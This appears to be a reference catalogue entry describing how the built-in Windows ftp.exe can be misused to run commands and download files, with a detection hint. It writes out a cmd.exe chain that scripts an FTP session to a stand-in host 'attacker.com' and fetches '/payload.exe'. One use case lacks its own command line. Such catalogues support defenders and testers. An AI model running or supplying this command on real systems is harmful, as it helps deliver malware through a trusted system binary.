name: Ftp.exe
description: A binary designed for connecting to FTP servers
author: Oddvar Moe

commands.description: Executes the commands you put inside the text file.
commands.usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand

commands.command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
commands.usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
commands.os: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

detection: cmd /c as child process of ftp.exe
